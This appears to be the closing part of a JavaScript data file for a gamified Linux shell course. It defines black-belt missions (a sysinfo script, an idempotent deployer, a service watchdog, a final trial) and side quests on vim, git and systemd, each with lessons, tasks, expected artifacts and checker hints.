          "xp": 150,
          "minutes": 45,
          "boss": false,
          "path": "missions/09-black-belt/02-sysinfo-suite/README.md",
          "intro": "Every ops team has a `sysinfo` script — the one you run first on any box to see what you're dealing with. Yours will be production-grade: strict mode, clean human output, and a `--json` flag for machines to consume. This is the tool you'll actually reuse after the dojo.",
          "learn": [
            {
              "h": "The professional script header",
              "code": "#!/usr/bin/env bash\nset -euo pipefail\n#     │││\n#     ││└ pipefail: a failing command mid-pipe fails the whole pipe\n#     │└ u: using an unset variable is an error (catches typos)\n#     └ e: exit immediately if any command fails",
              "label": "set -euo pipefail — the three words that make bash safe"
            },
            {
              "p": "Without `set -e`, a script barrels on after a failed command, often making things worse. Without `-u`, a mistyped `$HOSTNAEM` silently expands to empty. Without `pipefail`, `false | true` looks like success. These three are the seatbelt of every serious script."
            },
            {
              "h": "Gathering system facts portably",
              "code": "hostname                         # machine name\nuname -r                         # kernel release\nuname -s                         # OS (Linux, Darwin, …)\nwhoami                           # current user\ndate -u +%Y-%m-%dT%H:%M:%SZ      # UTC timestamp, ISO-8601",
              "label": "Prefer commands that exist everywhere"
            },
            {
              "h": "Emitting JSON by hand",
              "code": "printf '{\"hostname\":\"%s\",\"user\":\"%s\",\"kernel\":\"%s\"}\\n' \\\n    \"$(hostname)\" \"$(whoami)\" \"$(uname -r)\"",
              "label": "printf with a template = valid JSON, no dependencies"
            },
            {
              "p": "Real tools output *both* for humans and machines. A `--json` flag that emits a single compact JSON line lets your script feed dashboards, `jq` pipelines, and alerting — while the default stays readable. Designing for both consumers is a black-belt instinct."
            },
            {
              "h": "Parsing your own flags",
              "code": "mode=human\nif [ \"${1:-}\" = \"--json\" ]; then mode=json; fi\n# ${1:-} = '$1 or empty if unset' — safe under set -u",
              "label": "${var:-default} keeps set -u happy"
            },
            {
              "tip": "`${1:-}` is essential under `set -u`: a bare `$1` when no argument was passed would abort the script. The `:-` gives it a safe default. Memorize this pairing."
            }
          ],
          "task": [
            {
              "step": "Write `sysinfo.sh` starting with `#!/usr/bin/env bash` and `set -euo pipefail`."
            },
            {
              "step": "Default (human) output must print these labelled lines (values from your system):",
              "code": "hostname=<hostname>\nkernel=<uname -r>\nuser=<whoami>\nshell_pid=<the script's PID, e.g. $$>\ndate_utc=<ISO-8601 UTC timestamp, starts YYYY-MM-DD>"
            },
            {
              "step": "With `--json`, print a SINGLE line of valid JSON containing at least a `hostname` field, e.g. `{\"hostname\":\"...\",\"kernel\":\"...\",\"user\":\"...\"}`."
            },
            {
              "step": "Make it executable and test both modes:",
              "code": "chmod +x sysinfo.sh\n./sysinfo.sh\n./sysinfo.sh --json"
            },
            {
              "step": "Confirm it exits 0 in both modes (`echo $?`)."
            }
          ],
          "artifacts": [
            [
              "sysinfo.sh",
              "executable; contains set -euo pipefail; human mode prints the 5 keys; --json prints one JSON line with hostname; exits 0"
            ]
          ],
          "hints": [
            "shell_pid can just be `$$` (the script's own PID).",
            "date_utc: `date -u +%Y-%m-%dT%H:%M:%SZ` — the checker only checks it starts with a YYYY-MM-DD date.",
            "For --json, printf with a template is easiest and always valid. Keep it to ONE line.",
            "The checker greps your file for `set -euo pipefail` (or the equivalent set -e/-u/-o pipefail) — include it."
          ]
        },
        {
          "id": "9.3",
          "slug": "03-the-deployer",
          "title": "The Deployer",
          "tagline": "Ship a release the real way: build, render config, atomic layout.",
          "xp": 150,
          "minutes": 50,
          "boss": false,
          "path": "missions/09-black-belt/03-the-deployer/README.md",
          "intro": "Deployment is where all the belts converge: arguments, validation, directories, permissions, templating, and idempotency. You'll build a `deploy.sh` that lays out a release the way real systems do — a `current` release, shared logs, config rendered from a template — and that you can run twice without breaking anything.",
          "learn": [
            {
              "h": "Boss briefing — the deploy spec",
              "list": [
                "`./deploy.sh <target-dir> <port>` — two required arguments.",
                "No/one argument → usage on stderr, `exit 1`. Non-numeric port → error on stderr, `exit 2`.",
                "Build the layout under `<target-dir>/`: `current/` (the app) and `shared/logs/`.",
                "Copy the app from the provided `release/static/` and `release/run.sh` into `current/`.",
                "Render `release/app.conf.template` into `current/app.conf`, replacing `__PORT__` with the given port. The result must contain `port=<port>` and NO `__PORT__`.",
                "Set `current/app.conf` to mode `600` (it may hold secrets).",
                "Write a `<target-dir>/RELEASE` manifest with `version=` (from `release/VERSION`) and `port=`.",
                "Print `deployed <target-dir> on port <port>`, `exit 0`. Running it again must succeed (idempotent)."
              ]
            },
            {
              "h": "Validating a numeric argument",
              "code": "case \"$2\" in\n    ''|*[!0-9]*) echo \"port must be a number\" >&2; exit 2 ;;\nesac",
              "label": "The portable 'is it all digits?' test"
            },
            {
              "h": "Rendering a template with sed",
              "code": "sed \"s/__PORT__/$port/g\" release/app.conf.template > \"$target/current/app.conf\"",
              "label": "Substitute the placeholder — you learned this at orange belt"
            },
            {
              "h": "Idempotency — safe to run twice",
              "code": "mkdir -p \"$target/current\" \"$target/shared/logs\"   # -p never complains if they exist\ncp -r release/static/. \"$target/current/\"           # refresh contents",
              "label": "mkdir -p and overwriting copies make re-runs harmless"
            },
            {
              "p": "Idempotency is the deployment superpower: a script you can re-run any number of times and always end in the same correct state. `mkdir -p` (no error if exists) and copies that overwrite are the building blocks. A deploy that breaks on the second run is a deploy that pages you at 2 AM."
            },
            {
              "tip": "The `current/` + `shared/` layout mirrors real tools (Capistrano, etc.): code is disposable and versioned, while logs and uploads live in `shared/` so they survive every deploy. You're building a real pattern in miniature."
            }
          ],
          "task": [
            {
              "step": "Write `deploy.sh` implementing every point in the spec. Use `set -euo pipefail`."
            },
            {
              "step": "Handle the argument errors: wrong count → exit 1 (stderr usage); non-numeric port → exit 2 (stderr)."
            },
            {
              "step": "Build the layout, copy the app, render the config (no `__PORT__` left), chmod the conf to 600, write the RELEASE manifest."
            },
            {
              "step": "Test it — including running it twice:",
              "code": "chmod +x deploy.sh\n./deploy.sh; echo \"rc=$?\"                 # expect 1\n./deploy.sh ./out abc; echo \"rc=$?\"       # expect 2 (bad port)\n./deploy.sh ./out 8080; echo \"rc=$?\"      # expect 0\ncat out/current/app.conf out/RELEASE\n./deploy.sh ./out 8080                     # run AGAIN — must still succeed"
            }
          ],
          "artifacts": [
            [
              "deploy.sh",
              "executable; exit 1/2 on bad args; builds current/ + shared/logs/"
            ],
            [
              "out/current/app.conf",
              "mode 600; contains port=<port>; NO __PORT__ remains"
            ],
            [
              "out/RELEASE",
              "manifest with version= and port="
            ],
            [
              "idempotent",
              "second run with the same args also exits 0"
            ]
          ],
          "hints": [
            "Numeric check: the `case \"$2\" in ''|*[!0-9]*) ... ;; esac` idiom rejects empties and non-digits.",
            "Render with sed replacing __PORT__, then `chmod 600` the resulting app.conf.",
            "version= comes from `cat release/VERSION` (it's 1.0.0).",
            "For idempotency use `mkdir -p` and overwriting copies — never assume the dirs are absent."
          ]
        },
        {
          "id": "9.4",
          "slug": "04-the-watchdog",
          "title": "The Watchdog",
          "tagline": "Keep a service alive: detect death, restart, log with timestamps.",
          "xp": 150,
          "minutes": 50,
          "boss": false,
          "path": "missions/09-black-belt/04-the-watchdog/README.md",
          "intro": "Services crash. A watchdog notices and brings them back — the loop behind every 'self-healing' system. You'll build one against a provided fake service you can start, stop, and kill at will, and prove your watchdog does the right thing whether the service is alive or dead.",
          "learn": [
            {
              "h": "Boss briefing — the pieces",
              "list": [
                "A `fake-service.sh` is provided with `start`, `stop`, and `status` subcommands. It tracks a PID in `service.pid` and its `status` exits 0 if alive, non-zero if not.",
                "Your `watchdog.sh` checks the service once per run: if alive, log an OK line; if dead, start it and log a RESTARTED line.",
                "Every log line must be **timestamped** and appended to `watchdog.log`."
              ]
            },
            {
              "h": "Checking liveness by exit code",
              "code": "if ./fake-service.sh status >/dev/null 2>&1; then\n    # exit 0 → it's alive\nelse\n    # non-zero → it's down\nfi",
              "label": "Let the service's own status command be the source of truth"
            },
            {
              "h": "Timestamped logging",
              "code": "log() {\n    echo \"$(date +%Y-%m-%dT%H:%M:%S) $*\" >> watchdog.log\n}\nlog \"OK service alive pid=$(cat service.pid 2>/dev/null)\"\nlog \"RESTARTED service was down, started it\"",
              "label": "A log() helper keeps every line consistent"
            },
            {
              "h": "The PID-file pattern",
              "p": "A service writes its process id to a *pidfile* (`service.pid`) when it starts. To check if it's really alive, you read the pidfile and test the process: `kill -0 \"$pid\"` sends no signal but succeeds only if the process exists and you may signal it. That's the idiomatic liveness probe — the fake service already does this internally for you."
            },
            {
              "h": "Why watchdogs run on a timer",
              "p": "In production a watchdog runs from cron (`* * * * *`, every minute) or as a systemd timer. Each invocation is one check-and-maybe-restart. You're building that single invocation — the thing the scheduler calls. Keep it fast and idempotent: safe to run whether the service is up or down."
            },
            {
              "tip": "Real systems use `systemd` with `Restart=always` for this, but understanding the manual watchdog loop is what lets you debug systemd when *it* misbehaves. Know the mechanism, not just the magic."
            }
          ],
          "task": [
            {
              "step": "Study the provided `fake-service.sh` — try `./fake-service.sh start`, `status`, `stop` and watch `service.pid`."
            },
            {
              "step": "Write `watchdog.sh` that: checks the service via its `status`; if alive, appends a timestamped line containing `OK` and the pid to `watchdog.log`; if dead, runs `./fake-service.sh start` and appends a timestamped line containing `RESTARTED`."
            },
            {
              "step": "Prove both branches. Scenario A — service already running:",
              "code": "chmod +x watchdog.sh\n./fake-service.sh start\n./watchdog.sh        # should log an OK line\ntail watchdog.log"
            },
            {
              "step": "Scenario B — service down:",
              "code": "./fake-service.sh stop\n./watchdog.sh        # should START it and log a RESTARTED line\n./fake-service.sh status; echo \"rc=$?\"   # now rc=0 (alive again)\ntail watchdog.log"
            },
            {
              "step": "Clean up when done: `./fake-service.sh stop`. The checker runs its own alive/dead scenarios against your watchdog."
            }
          ],
          "artifacts": [
            [
              "watchdog.sh",
              "executable; logs OK when alive, RESTARTS + logs RESTARTED when dead"
            ],
            [
              "watchdog.log",
              "timestamped lines; contains both OK and RESTARTED across the scenarios"
            ]
          ],
          "hints": [
            "Use the service's own `status` exit code as truth — don't reinvent the liveness check.",
            "Each log line needs a timestamp (a date at the front) and the keyword (OK / RESTARTED).",
            "After a RESTARTED run, `./fake-service.sh status` must exit 0 — your watchdog actually started it.",
            "The checker stops the service, runs your watchdog, and asserts the service is alive afterward."
          ]
        },
        {
          "id": "9.5",
          "slug": "05-final-black-belt-trial",
          "title": "BOSS — The Final Black Belt Trial",
          "tagline": "One gauntlet. Every skill. Earn the black belt.",
          "xp": 400,
          "minutes": 75,
          "boss": true,
          "path": "missions/09-black-belt/05-final-black-belt-trial/README.md",
          "intro": "This is it, Sensei-to-be. A single sprawling `gauntlet/` that demands everything: navigation, globs and find, pipelines and forensics, permissions, a broken symlink to repair, and a script to tie it all together. No new concepts — only mastery. Finish this, and the black belt is yours. The dojo has no more to teach; from here you teach yourself.",
          "learn": [
            {
              "h": "The gauntlet, mapped",
              "list": [
                "`gauntlet/messy-data/` — 30 files of mixed types scattered across subdirectories. Sort them by type into `gauntlet/sorted/{text,images,docs,audio,configs}/`.",
                "`gauntlet/logs/access.log` — 500 requests to analyze with your forensic pipeline.",
                "`gauntlet/secrets/` — three credential files that must all be locked to `600`.",
                "`gauntlet/current` — a **broken symlink** pointing at a release that doesn't exist. Repair it to point at the real `releases/v1`.",
                "A final report and a report-generating script to write."
              ]
            },
            {
              "h": "Symlinks — creating and repairing",
              "code": "ls -l gauntlet/current                 # a dangling link shows its (missing) target\nrm gauntlet/current                    # remove the broken link\nln -s releases/v1 gauntlet/current     # point it at the real release\nreadlink gauntlet/current              # confirm the new target",
              "label": "ln -s TARGET LINKNAME  (target is relative to the link's location)"
            },
            {
              "p": "A **symbolic link** is a pointer to another path. If the target vanishes, the link *dangles* — it still exists but points at nothing (`ls` shows it, following it fails). You fix it by removing the link and recreating it toward a real target. The `current → releases/vN` symlink is exactly how zero-downtime deploys flip between versions."
            },
            {
              "h": "The forensic pipeline, one more time",
              "code": "cut -d' ' -f1 gauntlet/logs/access.log | sort | uniq -c | sort -nr | head   # top IPs\ngrep -c ' 500 ' gauntlet/logs/access.log                                      # server errors\ncut -d' ' -f1 gauntlet/logs/access.log | sort -u | wc -l                       # unique IPs",
              "label": "Everything from orange belt, on a bigger haystack"
            },
            {
              "h": "Counting sorted results",
              "code": "find gauntlet/sorted -type f | wc -l           # total files sorted\nfind gauntlet/sorted/images -type f | wc -l    # per-category",
              "label": "Prove your sort with counts"
            },
            {
              "tip": "Break the trial into the five areas and finish one completely before the next. A black belt's real skill isn't any single command — it's decomposing a big, messy problem into ordered, verifiable steps. Show that here."
            }
          ],
          "task": [
            {
              "step": "SORT: move all 30 files from `gauntlet/messy-data/` (any depth) into `gauntlet/sorted/{text,images,docs,audio,configs}/` by extension — `.txt`→text, `.jpg`→images, `.pdf`→docs, `.mp3`→audio, `.conf`→configs. (Hint: `find … -name '*.jpg' -exec mv {} gauntlet/sorted/images/ \\;` per type.)"
            },
            {
              "step": "SECURE: set every file in `gauntlet/secrets/` to mode `600`."
            },
            {
              "step": "REPAIR: fix the dangling `gauntlet/current` symlink so it points at `releases/v1` (which exists)."
            },
            {
              "step": "ANALYZE + REPORT: study `gauntlet/logs/access.log` and write `gauntlet/TRIAL.md` with exactly these keys:",
              "code": "total_requests=NUMBER_OF_LOG_LINES\nunique_ips=HOW_MANY_DISTINCT_IPS\ntop_ip=THE_MOST_ACTIVE_IP\ntop_ip_hits=HOW_MANY_REQUESTS_FROM_THE_TOP_IP\nserver_errors=HOW_MANY_500_RESPONSES\nnot_found=HOW_MANY_404_RESPONSES\ni_am=tux-sensei"
            },
            {
              "step": "AUTOMATE: write `gauntlet/gauntlet-report.sh` (executable, `set -euo pipefail`) that prints three lines — `files_sorted=<count in sorted/>`, `errors_found=<500 count from the log>`, and `status=all-clear`."
            }
          ],
          "artifacts": [
            [
              "gauntlet/sorted/*",
              "all 30 files sorted by type into the five category dirs"
            ],
            [
              "gauntlet/secrets/*",
              "every secret file mode 600"
            ],
            [
              "gauntlet/current",
              "symlink now resolves to releases/v1 (no longer dangling)"
            ],
            [
              "gauntlet/TRIAL.md",
              "seven keys incl. i_am=tux-sensei; log answers correct"
            ],
            [
              "gauntlet/gauntlet-report.sh",
              "executable; prints files_sorted=30, errors_found=<500s>, status=all-clear"
            ]
          ],
          "hints": [
            "Per-type moves from any depth: `find gauntlet/messy-data -name '*.txt' -exec mv {} gauntlet/sorted/text/ \\;` (repeat for each extension).",
            "total_requests = `wc -l < gauntlet/logs/access.log`; unique_ips = `cut -d' ' -f1 ... | sort -u | wc -l`.",
            "top_ip and top_ip_hits: the first line of `cut -d' ' -f1 ... | sort | uniq -c | sort -nr | head -1`.",
            "server_errors = count of ' 500 ' lines; not_found = count of ' 404 ' lines.",
            "i_am must be exactly `tux-sensei`. files_sorted should be 30 after you finish the sort."
          ]
        }
      ]
    },
    {
      "n": 10,
      "slug": "10-side-quests",
      "name": "Side Quests",
      "color": "#f472b6",
      "rank": "Ronin",
      "motto": "Off the main path, sharpening the blade: vim, git, and services.",
      "notebook": "Your personal vim crib sheet: the ten commands you actually used today. That page will be worth gold every time you SSH into a server.",
      "side": true,
      "missions": [
        {
          "id": "10.1",
          "slug": "01-vim-gauntlet",
          "title": "The Vim Gauntlet",
          "tagline": "Survive — then quietly start liking — the editor on every server.",
          "xp": 100,
          "minutes": 35,
          "boss": false,
          "path": "missions/10-side-quests/01-vim-gauntlet/README.md",
          "intro": "One day you'll SSH into a box that has no VS Code, no nano, no mercy — only `vim`. Every admin has lived it. This quest makes vim a tool instead of a trap: the modes, the survival keys, and one real editing gauntlet on a scroll.",
          "learn": [
            {
              "h": "The big idea: modes",
              "p": "vim is a *modal* editor. In **NORMAL** mode, keys are commands (move, delete, copy). Press `i` to enter **INSERT** mode and type like a regular editor; press `Esc` to return to NORMAL. Beginners suffer because they type commands while in INSERT — when lost, press `Esc` (twice, for confidence) and you're back on solid ground."
            },
            {
              "h": "Minimum viable vim",
              "code": "vim scroll.txt\ni        # INSERT mode — type freely\nEsc      # back to NORMAL\n:wq      # write (save) and quit\n:q!      # quit WITHOUT saving (your panic button)",
              "label": "Enough to never be trapped again"
            },
            {
              "h": "The NORMAL-mode moves you'll use forever",
              "list": [
                "`dd` — delete the current line · `yy` — copy (yank) it · `p` — paste below",
                "`u` — undo · `Ctrl+r` — redo",
                "`gg` / `G` — jump to first / last line · `5G` — jump to line 5",
                "`/text` then Enter — search; `n` jumps to the next match",
                "`:%s/old/new/g` — replace `old` with `new` in the whole file"
              ]
            },
            {
              "h": "Do vimtutor. Seriously.",
              "code": "vimtutor    # ships with vim — a guided 15-minute lesson\n# no vim yet?  sudo apt install -y vim   (Debian/Ubuntu)",
              "label": "15 minutes that repay a year of suffering"
            },
            {
              "p": "Lessons 1 and 2 of `vimtutor` cover everything this gauntlet needs. Type it by hand — that's the pact — and your fingers will remember when it matters."
            },
            {
              "tip": "vim is on every Linux server built in the last 30 years. Being merely *comfortable* in it is a professional superpower that takes one afternoon to acquire."
            }
          ],
          "task": [
            {
              "step": "Run `vimtutor` and complete at least lessons 1 and 2 (honor system — the pact is with yourself)."
            },
            {
              "step": "Open the provided scroll in vim: `vim scroll.txt`. Then, using only NORMAL-mode commands:"
            },
            {
              "step": "Delete line 5 (the one begging for it): `5G` then `dd`."
            },
            {
              "step": "Copy line 2 and paste it at the very end: `2G`, `yy`, `G`, `p`."
            },
            {
              "step": "Replace every lowercase word `line` with `step` in the whole file: `:%s/line/step/g`."
            },
            {
              "step": "Save and quit with `:wq`, then create `answers.md`:",
              "code": "insert_key=THE_KEY_THAT_ENTERS_INSERT_MODE\nsave_quit=THE_COMMAND_THAT_SAVES_AND_QUITS\nquit_no_save=THE_PANIC_BUTTON_COMMAND\nundo_key=THE_UNDO_KEY"
            }
          ],
          "artifacts": [
            [
              "scroll.txt",
              "edited exactly: line 5 gone, old line 2 duplicated at the end, every 'line' → 'step'"
            ],
            [
              "answers.md",
              "insert_key=i, save_quit=:wq, quit_no_save=:q!, undo_key=u"
            ]
          ],
          "hints": [
            "Do the steps in the listed order and the result is deterministic — the checker compares the exact final scroll.",
            "Typed a wrong command? `u` undoes it. Truly lost? `:q!` and reopen the file (restore the original with `git restore scroll.txt` if needed).",
            "`:%s/line/step/g` is case-sensitive — capitalized words are untouched, which is exactly what you want here."
          ]
        },
        {
          "id": "10.2",
          "slug": "02-git-time-machine",
          "title": "Git Time Machine",
          "tagline": "status, log, restore, branch, commit — git as a survival skill.",
          "xp": 100,
          "minutes": 35,
          "boss": false,
          "path": "missions/10-side-quests/02-git-time-machine/README.md",
          "intro": "This whole dojo lives in git — which means you've been carrying a time machine the entire journey. Today you learn to drive it: see what changed, resurrect a deleted file, branch safely, and write your first proper commit.",
          "learn": [
            {
              "h": "Tell git who you are (once per machine)",
              "code": "git config --global user.name \"Your Name\"\ngit config --global user.email \"you@example.com\"\n# commits are signed with this identity — git refuses to commit without it",
              "label": "Skip this and your first commit will complain"
            },
            {
              "h": "Reading the present and the past",
              "code": "git status                 # what changed since the last commit?\ngit status --short         # the compact view you'll grow to prefer\ngit log --oneline -10      # the last 10 commits, one line each\ngit diff                   # exactly WHAT changed, line by line",
              "label": "The three commands you'll run 50 times a day"
            },
            {
              "h": "The resurrection drill (why git is your safety net)",
              "code": "rm precious.txt             # oops. gone. no trash can, remember?\ngit status                  # git noticed: 'deleted: precious.txt'\ngit restore precious.txt    # ...and it's BACK. (older git: git checkout -- precious.txt)",
              "label": "Deleted ≠ lost, as long as it was committed"
            },
            {
              "p": "This is why the dojo told you from day one: *git is your time machine*. Anything committed can be resurrected. Anything **not** committed is one `rm` from oblivion — which is the whole argument for committing early and often."
            },
            {
              "h": "Branches: parallel timelines",
              "code": "git branch                    # where am I?\ngit branch training/dojo      # create a new branch (timeline)\ngit switch training/dojo      # jump onto it (older git: git checkout)\ngit switch -                  # jump back",
              "label": "Branches are free — use them for every experiment"
            },
            {
              "h": "A commit worth reading",
              "code": "git add missions/10-side-quests/02-git-time-machine/git-notes.md\ngit commit -m \"dojo: complete the git time machine side quest\"\n#            └ a good message: short prefix + what it does",
              "label": "Stage, then commit with a message future-you will thank"
            },
            {
              "tip": "Never commit secrets: private keys, `.env`, tokens. You proved this reflex at purple belt with `.gitignore` + `git check-ignore` — it applies to every repo you'll ever touch."
            }
          ],
          "task": [
            {
              "step": "Make sure git knows you: `git config --global user.name` / `user.email` (set them if empty)."
            },
            {
              "step": "From the repo root, read the machine: `git status`, then `git log --oneline -5`."
            },
            {
              "step": "THE DRILL — in this mission folder, delete `precious.txt` with `rm`, confirm it's gone with `ls`, then resurrect it:",
              "code": "rm precious.txt\nls\ngit restore precious.txt    # or: git checkout -- precious.txt\ncat precious.txt             # back from the dead"
            },
            {
              "step": "Create a training branch (no need to switch): `git branch training/dojo`."
            },
            {
              "step": "Write `git-notes.md` in this folder:",
              "code": "restore_cmd=THE_COMMAND_THAT_RESURRECTED_THE_FILE   # one word is enough\nbranch_created=training/dojo\nnever_commit=WHAT_MUST_NEVER_ENTER_A_REPO   # think purple belt"
            },
            {
              "step": "Stage and commit it with a message that starts with `dojo:`:",
              "code": "git add missions/10-side-quests/02-git-time-machine/git-notes.md\ngit commit -m \"dojo: complete the git time machine side quest\""
            }
          ],
          "artifacts": [
            [
              "precious.txt",
              "present and intact (resurrected, not recreated by hand)"
            ],
            [
              "a branch",
              "`git branch --list 'training/*'` shows training/dojo"
            ],
            [
              "a commit",
              "`git log` contains a commit message starting with dojo:"
            ],
            [
              "git-notes.md",
              "restore_cmd, branch_created, never_commit"
            ]
          ],
          "hints": [
            "If `git commit` complains about identity, run the two `git config --global` lines first.",
            "`git restore` is the modern spelling; `git checkout -- <file>` does the same on older git. The checker accepts either word in restore_cmd.",
            "The commit can include other work too — the checker only looks for the `dojo:` message in your history."
          ]
        },
        {
          "id": "10.3",
          "slug": "03-service-commander",
          "title": "Service Commander",
          "tagline": "systemctl & journalctl — command the daemons like an admin.",
          "xp": 100,
          "minutes": 35,
          "boss": false,
          "path": "missions/10-side-quests/03-service-commander/README.md",
          "intro": "Real servers run *services*: nginx, postgres, your app — supervised by systemd. When something breaks at 3 AM, the admin ritual is always the same trio: check the status, read the logs, restart. Today you learn the ritual on captured evidence, so it grades the same on any machine.",
          "learn": [
            {
              "h": "The systemd model",
              "p": "systemd is the manager that starts and supervises services (*units*). `systemctl` gives orders; `journalctl` reads their logs. A unit can be **active (running)**, **inactive**, or **failed** — and separately **enabled** (starts on boot) or **disabled**. `enable` and `start` are different questions: *from now on* vs *right now*."
            },
            {
              "h": "The commands",
              "code": "systemctl status nginx          # state, PID, memory, last log lines — the first look\nsudo systemctl start nginx      # start it now\nsudo systemctl restart nginx    # stop + start (after a config change)\nsudo systemctl enable nginx     # start automatically on boot\njournalctl -u nginx -n 50       # last 50 log lines of THAT unit\njournalctl -u nginx -f          # follow live (the service's tail -f)\nsystemctl list-units --type=service   # everything running",
              "label": "The admin's daily bread"
            },
            {
              "h": "Reading a status block",
              "code": "● nginx.service - A high performance web server...\n     Loaded: loaded (...; enabled; ...)     ← starts on boot\n     Active: active (running) since ...     ← alive right now\n   Main PID: 1200 (nginx)                   ← the process to trace",
              "label": "Three lines tell you almost everything"
            },
            {
              "h": "The triage ritual (memorize the order)",
              "list": [
                "1. **status** — is it running? since when? what did it say last?",
                "2. **logs** — `journalctl -u <unit> -n 50`: WHY did it fail? (exit code 127 = command not found; 1 = generic error; 137 = killed)",
                "3. **restart** — only after you understand; then status again to confirm."
              ]
            },
            {
              "p": "Restarting *before* reading logs destroys evidence and often just reproduces the crash. Status → logs → restart. That order is the difference between an operator and a button-pusher — and it's exactly what the samples in this mission let you practice."
            },
            {
              "tip": "WSL2 ships with systemd enabled these days, so these commands work in your dojo. Containers usually don't have it — that's why this mission grades on captured evidence, plus one live probe that adapts to your machine."
            }
          ],
          "task": [
            {
              "step": "Study `sample/systemctl-status.txt` (a healthy nginx), `sample/systemctl-failed.txt` (a crashed unit) and `sample/journal.txt` (its logs)."
            },
            {
              "step": "Answer the triage in `answers.md`:",
              "code": "nginx_state=ACTIVE_STATE_OF_NGINX          # one word from the Active: line\nnginx_main_pid=THE_MAIN_PID\nnginx_enabled=DOES_IT_START_ON_BOOT           # the word from Loaded:\nfailed_unit=THE_NAME_OF_THE_BROKEN_SERVICE    # without .service is fine\nexit_status=THE_NUMERIC_EXIT_CODE_OF_THE_CRASH\nroot_cause=THE_MISSING_COMMAND_IN_THE_LOGS    # one word"
            },
            {
              "step": "Write your `runbook.md` — the ritual you'd run on a real box, in order, with real commands (status first, logs second, restart third). Include the literal commands `systemctl status`, `journalctl -u` and `systemctl restart`, plus:",
              "code": "first_step=status"
            },
            {
              "step": "One live probe — works with or without systemd on your machine (note the `||` fallback doing the graceful degradation):",
              "code": "{ systemctl list-units --type=service 2>/dev/null || echo \"no systemd on this machine\"; } | head -20 > systemctl-live.txt"
            }
          ],
          "artifacts": [
            [
              "answers.md",
              "six triage answers from the captured evidence"
            ],
            [
              "runbook.md",
              "the trio in order: systemctl status → journalctl -u → systemctl restart, plus first_step=status"
            ],
            [
              "systemctl-live.txt",
              "your machine's live probe (or the graceful fallback line)"
            ]
          ],
          "hints": [
            "exit_status: the failed unit's Process line ends with `status=NNN` — that number.",
            "root_cause: the journal's last lines name the command that was not found.",
            "The runbook is prose + commands — the checker greps for the three commands and the first_step key."
          ]
        }
      ]
    }
  ]
};
